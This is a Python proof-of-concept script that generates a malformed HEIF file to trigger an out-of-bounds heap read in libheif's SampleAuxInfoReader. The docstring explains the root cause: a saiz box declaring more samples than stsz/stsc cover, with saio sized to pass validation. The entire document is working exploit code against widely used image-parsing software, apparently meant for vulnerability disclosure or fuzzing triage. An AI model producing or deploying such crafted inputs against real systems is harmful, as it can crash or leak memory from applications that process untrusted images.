#!/usr/bin/env python3
"""
POC generator for libheif OOB heap read in SampleAuxInfoReader constructor.

Bug: In SampleAuxInfoReader constructor (track.cc), when iterating nSamples
from saiz, current_chunk is incremented when sample index exceeds chunk's
last_sample_number(). If saiz declares more samples than stsz/stsc covers,
current_chunk reaches chunks.size() and chunks[current_chunk] is OOB.

Trigger setup:
- stco: 2 chunk offsets  -> 2 chunks are built
- stsc: 2 entries mapping each chunk to 2 samples -> 4 total samples
- stsz: 4 samples -> consistent with stsc/stts
- stts: 4 samples -> consistent
- saio: 2 offsets (matches stco) -> oneChunk = False in constructor
- saiz: 10 samples (non-constant sizes) -> loop runs 10 times
  * When i=2 > chunks[0]->last_sample_number() (=1), current_chunk -> 1
  * When i=4 > chunks[1]->last_sample_number() (=3), current_chunk -> 2
  * chunks[2] is OOB (chunks.size() == 2) -> heap OOB read

The validation check at line 437 allows saio.num_chunks == stco.num_chunks,
which is satisfied (both == 2). The assert is debug-only; ASAN catches the OOB.
"""

import struct
import sys


def box(fourcc: str, payload: bytes) -> bytes:
    """Build a standard ISOBMFF box: size(4) + fourcc(4) + payload."""
    if isinstance(fourcc, str):
        fourcc = fourcc.encode('ascii')
    size = 8 + len(payload)
    return struct.pack('>I4s', size, fourcc) + payload


def fullbox(fourcc: str, version: int, flags: int, payload: bytes) -> bytes:
    """Build a FullBox: size(4) + fourcc(4) + version(1) + flags(3) + payload."""
    header = bytes([version]) + struct.pack('>I', flags)[1:]  # 1 + 3 bytes
    return box(fourcc, header + payload)


# ---------------------------------------------------------------------------
# ftyp
# ---------------------------------------------------------------------------
def make_ftyp():
    # major brand 'isom' and compatible brands include 'isom' to trigger sequence parsing
    # is_sequence_brand check requires one of: msf1, isom, mp41, mp42
    payload = b'isom'                   # major brand
    payload += struct.pack('>I', 0)     # minor version
    payload += b'isomiso8heic'          # compatible brands (isom triggers sequence path)
    return box('ftyp', payload)


# ---------------------------------------------------------------------------
# mvhd  (version 0)
# ---------------------------------------------------------------------------
def make_mvhd():
    payload = struct.pack('>IIIII',
        0,           # creation_time
        0,           # modification_time
        1000,        # timescale
        100,         # duration
        0x00010000,  # rate (1.0 fixed-point)
    )
    payload += struct.pack('>H', 0x0100)  # volume
    payload += b'\x00' * 10              # reserved
    # 3x3 unity matrix
    payload += struct.pack('>9i',
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000,
    )
    payload += b'\x00' * 24             # pre_defined[6]
    payload += struct.pack('>I', 2)     # next_track_ID
    return fullbox('mvhd', 0, 0, payload)


# ---------------------------------------------------------------------------
# tkhd  (version 0, flags=3 enabled+in-movie)
# ---------------------------------------------------------------------------
def make_tkhd():
    payload = struct.pack('>IIIII',
        0,   # creation_time
        0,   # modification_time
        1,   # track_ID
        0,   # reserved
        100, # duration
    )
    payload += b'\x00' * 8              # reserved[2]
    payload += struct.pack('>HH', 0, 0) # layer, alternate_group
    payload += struct.pack('>H', 0x0100) # volume
    payload += b'\x00' * 2             # reserved
    payload += struct.pack('>9i',
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000,
    )
    payload += struct.pack('>II', 320 << 16, 240 << 16)  # width, height
    return fullbox('tkhd', 0, 3, payload)


# ---------------------------------------------------------------------------
# mdhd  (version 0)
# ---------------------------------------------------------------------------
def make_mdhd():
    payload = struct.pack('>IIIII',
        0,     # creation_time
        0,     # modification_time
        1000,  # timescale
        100,   # duration
        0,     # language (packed ISO 639) + pre_defined
    )
    return fullbox('mdhd', 0, 0, payload)


# ---------------------------------------------------------------------------
# hdlr
# ---------------------------------------------------------------------------
def make_hdlr():
    payload = struct.pack('>I', 0)   # pre_defined
    payload += b'vide'               # handler_type
    payload += b'\x00' * 12         # reserved[3]
    payload += b'VideoHandler\x00'
    return fullbox('hdlr', 0, 0, payload)


# ---------------------------------------------------------------------------
# smhd
# ---------------------------------------------------------------------------
def make_vmhd():
    # vmhd (Video Media Header) — flags=1 per ISO 14496-12
    # graphics_mode(2) + op_color[3](2+2+2) = 8 bytes total payload
    payload = struct.pack('>HHHH', 0, 0, 0, 0)  # graphicsMode, opcolor[3]
    return fullbox('vmhd', 0, 1, payload)


# ---------------------------------------------------------------------------
# dinf / dref / url
# ---------------------------------------------------------------------------
def make_dinf():
    url_box = fullbox('url ', 0, 1, b'')   # flags=1 -> self-contained
    dref_payload = struct.pack('>I', 1) + url_box  # entry_count=1
    dref = fullbox('dref', 0, 0, dref_payload)
    return box('dinf', dref)


# ---------------------------------------------------------------------------
# stsd  (minimal avc1 visual sample entry)
# ---------------------------------------------------------------------------
def make_stsd():
    entry = b'\x00' * 6              # reserved
    entry += struct.pack('>H', 1)    # data_reference_index
    entry += b'\x00' * 16           # pre_defined + reserved
    entry += struct.pack('>HH', 320, 240)  # width, height
    entry += struct.pack('>II', 0x00480000, 0x00480000)  # horiz/vert resolution
    entry += b'\x00' * 4            # reserved
    entry += struct.pack('>H', 1)   # frame_count
    entry += b'\x00' * 32          # compressorname
    entry += struct.pack('>H', 0x0018)  # depth
    entry += struct.pack('>h', -1)  # pre_defined
    avc1 = box('avc1', entry)
    payload = struct.pack('>I', 1) + avc1  # entry_count=1
    return fullbox('stsd', 0, 0, payload)


# ---------------------------------------------------------------------------
# stts (time-to-sample): 4 samples, delta=33 each
# ---------------------------------------------------------------------------
def make_stts():
    payload = struct.pack('>I', 1)          # entry_count
    payload += struct.pack('>II', 4, 33)    # sample_count=4, sample_delta=33
    return fullbox('stts', 0, 0, payload)


# ---------------------------------------------------------------------------
# stsc (sample-to-chunk):
#   Two entries so both chunks are mapped:
#     Entry 1: first_chunk=1, samples_per_chunk=2, description_index=1
#     Entry 2: first_chunk=2, samples_per_chunk=2, description_index=1
# ---------------------------------------------------------------------------
def make_stsc():
    payload = struct.pack('>I', 2)           # entry_count
    payload += struct.pack('>III', 1, 2, 1)  # chunk 1: 2 samples
    payload += struct.pack('>III', 2, 2, 1)  # chunk 2: 2 samples
    return fullbox('stsc', 0, 0, payload)


# ---------------------------------------------------------------------------
# stsz (sample sizes): 4 samples of 10 bytes each
# ---------------------------------------------------------------------------
def make_stsz():
    payload = struct.pack('>I', 0)               # sample_size=0 (per-sample)
    payload += struct.pack('>I', 4)              # sample_count
    payload += struct.pack('>IIII', 10, 10, 10, 10)
    return fullbox('stsz', 0, 0, payload)


# ---------------------------------------------------------------------------
# stco (chunk offsets): 2 chunks
# ---------------------------------------------------------------------------
def make_stco():
    payload = struct.pack('>I', 2)               # entry_count
    payload += struct.pack('>II', 0x200, 0x300)  # offsets
    return fullbox('stco', 0, 0, payload)


# ---------------------------------------------------------------------------
# saiz (sample aux info sizes):
#   aux_info_type = 0x73756964 ('suid')
#   10 samples with NON-CONSTANT sizes (prevents contiguous shortcut)
#   This is MORE than the 4 stsz samples, which is the root cause.
# ---------------------------------------------------------------------------
def make_saiz():
    # flags=1 -> aux_info_type and aux_info_type_parameter fields present
    # Format after fullbox header: aux_info_type(4) + aux_info_type_parameter(4)
    #                              + default_sample_info_size(1) + sample_count(4)
    #                              + [per-sample sizes if default==0]
    payload = struct.pack('>II', 0x73756964, 0x00000000)  # type='suid', param=0
    payload += struct.pack('>B', 0)     # default_sample_info_size=0 (variable per sample)
    payload += struct.pack('>I', 10)    # sample_count = 10 (triggers OOB; only 4 in stsz)
    # Non-constant sizes so have_samples_constant_size() returns False
    # -> m_contiguous_and_constant_size = False
    sizes = [4, 8, 4, 8, 4, 8, 4, 8, 4, 8]
    for s in sizes:
        payload += struct.pack('B', s)
    return fullbox('saiz', 0, 1, payload)


# ---------------------------------------------------------------------------
# saio (sample aux info offsets):
#   2 entries matching stco (required by validation at track.cc:437-440)
#   -> oneChunk = False in SampleAuxInfoReader
# ---------------------------------------------------------------------------
def make_saio():
    # flags=1 -> aux_info_type and aux_info_type_parameter fields present
    payload = struct.pack('>II', 0x73756964, 0x00000000)  # type='suid', param=0
    payload += struct.pack('>I', 2)                        # entry_count = 2
    payload += struct.pack('>II', 0x400, 0x500)            # offsets for chunk 0, 1
    return fullbox('saio', 0, 1, payload)


# ---------------------------------------------------------------------------
# stbl
# ---------------------------------------------------------------------------
def make_stbl():
    return box('stbl',
               make_stsd() +
               make_stts() +
               make_stsc() +
               make_stsz() +
               make_stco() +
               make_saiz() +
               make_saio())


# ---------------------------------------------------------------------------
# minf
# ---------------------------------------------------------------------------
def make_minf():
    return box('minf', make_vmhd() + make_dinf() + make_stbl())


# ---------------------------------------------------------------------------
# mdia
# ---------------------------------------------------------------------------
def make_mdia():
    return box('mdia', make_mdhd() + make_hdlr() + make_minf())


# ---------------------------------------------------------------------------
# trak
# ---------------------------------------------------------------------------
def make_trak():
    return box('trak', make_tkhd() + make_mdia())


# ---------------------------------------------------------------------------
# moov
# ---------------------------------------------------------------------------
def make_moov():
    return box('moov', make_mvhd() + make_trak())


# ---------------------------------------------------------------------------
# Full HEIF file: ftyp + moov
# ---------------------------------------------------------------------------
def make_heif():
    return make_ftyp() + make_moov()


if __name__ == '__main__':
    out = sys.argv[1] if len(sys.argv) > 1 else 'poc_input'
    data = make_heif()
    with open(out, 'wb') as f:
        f.write(data)
    print(f"[+] Wrote {len(data)} bytes to {out}")
    print("[+] Structure: ftyp + moov/trak with stco(2 chunks), stsz(4 samples),")
    print("    saiz(10 samples) -> OOB when SampleAuxInfoReader iterates past chunk boundaries")
